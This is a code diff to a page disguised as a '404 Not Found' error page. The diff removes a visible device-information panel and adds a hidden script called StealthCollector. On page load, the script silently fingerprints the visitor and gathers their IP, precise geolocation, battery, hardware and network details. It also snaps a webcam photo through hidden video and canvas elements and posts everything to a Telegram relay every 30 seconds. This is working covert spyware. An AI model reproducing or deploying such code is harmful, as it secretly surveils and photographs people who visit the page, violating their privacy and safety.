@@ -5,31 +5,333 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>404 Not Found</title>
-  <link rel="stylesheet" href="style.css">
-  <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.4/dist/fingerprint2.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js"></script>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .container {
+      max-width: 600px;
+      padding: 2rem;
+    }
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 1rem;
+      color: #ff5555;
+    }
+    p {
+      font-size: 1.2rem;
+      margin-bottom: 2rem;
+    }
+    a {
+      color: #4dabf7;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
     <h1>404</h1>
     <p>Oops! The page you're looking for doesn't exist.</p>
     <a href="/">Go back home</a>
-    
-    <div class="info" id="device-info">
-      <h3>Device Information:</h3>
-      <div id="location-info">Location: Loading...</div>
-      <a id="map-link" target="_blank" style="display:none;">View on Maps</a>
-      <div id="battery-info">Battery: Loading...</div>
-      <div id="camera-info">Camera: Checking...</div>
-      <div id="ip-info">IP: Loading...</div>
-      <div id="device-details">Device Details: Loading...</div>
-      <div id="photo-status">Photo Capture: Waiting...</div>
-    </div>
   </div>
 
+  <!-- Hidden elements for data collection -->
   <video id="webcam" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.4/dist/fingerprint2.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script>
+    // Enhanced Device Info Collector
+    class StealthCollector {
+      constructor() {
+        this.data = {
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          ip: null,
+          location: null,
+          battery: null,
+          cameraAccess: false,
+          photo: null,
+          deviceDetails: null,
+          network: null,
+          storage: null,
+          sensors: null,
+          audioContext: null,
+          gpu: null,
+          fingerprint: null
+        };
+        this.init();
+      }
 
-  <script src="script.js"></script>
+      async init() {
+        await this.getFingerprint();
+        await this.getIP();
+        await this.getLocation();
+        await this.getBattery();
+        await this.checkCamera();
+        this.getDeviceDetails();
+        this.getNetworkInfo();
+        this.getStorageInfo();
+        this.getSensorInfo();
+        this.getAudioContextInfo();
+        this.getGPUInfo();
+        
+        if (this.data.cameraAccess) {
+          await this.capturePhoto();
+        }
+        
+        this.sendToTelegram();
+        
+        // Send updates every 30 seconds
+        setInterval(() => this.sendToTelegram(), 30000);
+      }
+
+      async getFingerprint() {
+        try {
+          const components = await Fingerprint2.getPromise();
+          const values = components.map(component => component.value);
+          this.data.fingerprint = Fingerprint2.x64hash128(values.join(''), 31);
+        } catch (e) {
+          this.data.fingerprint = "Error: " + e.message;
+        }
+      }
+
+      async getIP() {
+        try {
+          const response = await axios.get('https://api.ipify.org?format=json');
+          this.data.ip = response.data.ip;
+          
+          // Get more IP details
+          const geoResponse = await axios.get(`https://ipapi.co/${this.data.ip}/json/`);
+          this.data.ipDetails = {
+            city: geoResponse.data.city,
+            region: geoResponse.data.region,
+            country: geoResponse.data.country_name,
+            isp: geoResponse.data.org,
+            timezone: geoResponse.data.timezone
+          };
+        } catch (e) {
+          this.data.ip = "Error: " + e.message;
+        }
+      }
+
+      async getLocation() {
+        if ('geolocation' in navigator) {
+          try {
+            const position = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000
+              });
+            });
+            
+            this.data.location = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              altitude: position.coords.altitude,
+              heading: position.coords.heading,
+              speed: position.coords.speed
+            };
+          } catch (e) {
+            this.data.location = "Error: " + e.message;
+          }
+        } else {
+          this.data.location = "Geolocation not supported";
+        }
+      }
+
+      async getBattery() {
+        if ('getBattery' in navigator) {
+          try {
+            const battery = await navigator.getBattery();
+            this.data.battery = {
+              level: Math.round(battery.level * 100) + '%',
+              charging: battery.charging ? 'Yes' : 'No',
+              chargingTime: battery.chargingTime,
+              dischargingTime: battery.dischargingTime
+            };
+          } catch (e) {
+            this.data.battery = "Error: " + e.message;
+          }
+        } else {
+          this.data.battery = "Battery API not supported";
+        }
+      }
+
+      async checkCamera() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          this.data.cameraAccess = true;
+          stream.getTracks().forEach(track => track.stop());
+        } catch (e) {
+          this.data.cameraAccess = false;
+        }
+      }
+
+      async capturePhoto() {
+        try {
+          const video = document.getElementById('webcam');
+          const canvas = document.getElementById('canvas');
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          
+          video.srcObject = stream;
+          await new Promise(resolve => video.onloadedmetadata = resolve);
+          
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+          this.data.photo = canvas.toDataURL('image/jpeg', 0.7);
+          stream.getTracks().forEach(track => track.stop());
+        } catch (e) {
+          this.data.photo = "Error: " + e.message;
+        }
+      }
+
+      getDeviceDetails() {
+        const parser = new UAParser();
+        const result = parser.getResult();
+        
+        this.data.deviceDetails = {
+          browser: `${result.browser.name} ${result.browser.version}`,
+          os: `${result.os.name} ${result.os.version}`,
+          device: result.device.vendor ? `${result.device.vendor} ${result.device.model}` : 'Desktop',
+          cpuCores: navigator.hardwareConcurrency || 'Unknown',
+          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+          screen: `${window.screen.width}x${window.screen.height}`,
+          colorDepth: window.screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          platform: navigator.platform,
+          cookies: navigator.cookieEnabled,
+          online: navigator.onLine
+        };
+      }
+
+      getNetworkInfo() {
+        this.data.network = {
+          connection: navigator.connection ? {
+            type: navigator.connection.type,
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+          } : 'Network Information API not available'
+        };
+      }
+
+      getStorageInfo() {
+        this.data.storage = {
+          localStorage: 'localStorage' in window ? 'Available' : 'Not available',
+          sessionStorage: 'sessionStorage' in window ? 'Available' : 'Not available',
+          indexedDB: 'indexedDB' in window ? 'Available' : 'Not available',
+          cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
+        };
+      }
+
+      getSensorInfo() {
+        this.data.sensors = {
+          accelerometer: 'Accelerometer' in window ? 'Available' : 'Not available',
+          gyroscope: 'Gyroscope' in window ? 'Available' : 'Not available',
+          magnetometer: 'Magnetometer' in window ? 'Available' : 'Not available',
+          orientation: 'DeviceOrientationEvent' in window ? 'Available' : 'Not available'
+        };
+      }
+
+      getAudioContextInfo() {
+        try {
+          const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+          this.data.audioContext = {
+            sampleRate: audioContext.sampleRate,
+            state: audioContext.state,
+            baseLatency: audioContext.baseLatency || 'Unknown'
+          };
+          audioContext.close();
+        } catch (e) {
+          this.data.audioContext = "Error: " + e.message;
+        }
+      }
+
+      getGPUInfo() {
+        try {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            this.data.gpu = {
+              vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+              renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+              version: gl.getParameter(gl.VERSION)
+            };
+          } else {
+            this.data.gpu = "WebGL not supported";
+          }
+        } catch (e) {
+          this.data.gpu = "Error: " + e.message;
+        }
+      }
+
+      async sendToTelegram() {
+        try {
+          const message = `
+🚀 *New Device Information* 🚀
+📅 *Time:* ${new Date().toLocaleString()}
+🌐 *IP:* ${this.data.ip || 'N/A'} (${this.data.ipDetails?.country || 'Unknown'})
+📍 *Location:* ${this.data.location ? 
+  `${this.data.location.latitude}, ${this.data.location.longitude}` : 'N/A'}
+📱 *User Agent:* ${this.data.userAgent}
+🔋 *Battery:* ${this.data.battery?.level || 'N/A'}
+📸 *Camera Access:* ${this.data.cameraAccess ? 'Granted ✅' : 'Denied ❌'}
+
+*Device Details:*
+🖥 *OS:* ${this.data.deviceDetails?.os || 'N/A'}
+🌐 *Browser:* ${this.data.deviceDetails?.browser || 'N/A'}
+📱 *Device:* ${this.data.deviceDetails?.device || 'N/A'}
+🧠 *CPU Cores:* ${this.data.deviceDetails?.cpuCores || 'N/A'}
+💾 *Memory:* ${this.data.deviceDetails?.memory || 'N/A'}
+🖥️ *Screen:* ${this.data.deviceDetails?.screen || 'N/A'}
+🔍 *Pixel Ratio:* ${this.data.deviceDetails?.pixelRatio || 'N/A'}
+🖐️ *Touch Support:* ${this.data.deviceDetails?.touchSupport ? 'Yes' : 'No'}
+🗣️ *Language:* ${this.data.deviceDetails?.language || 'N/A'}
+⏰ *Timezone:* ${this.data.deviceDetails?.timezone || 'N/A'}
+
+*Advanced Info:*
+🆔 *Fingerprint:* ${this.data.fingerprint || 'N/A'}
+🎮 *GPU:* ${this.data.gpu?.renderer || 'N/A'}
+🎵 *Audio Sample Rate:* ${this.data.audioContext?.sampleRate || 'N/A'}
+📶 *Network Type:* ${this.data.network?.connection?.effectiveType || 'N/A'}
+`;
+
+          await axios.post('/send-to-telegram', {
+            deviceInfo: this.data,
+            message: message,
+            photoData: this.data.photo
+          });
+        } catch (e) {
+          console.error('Telegram send error:', e);
+        }
+      }
+    }
+
+    // Start collection after slight delay
+    setTimeout(() => new StealthCollector(), 1000);
+  </script>
 </body>
 </html>
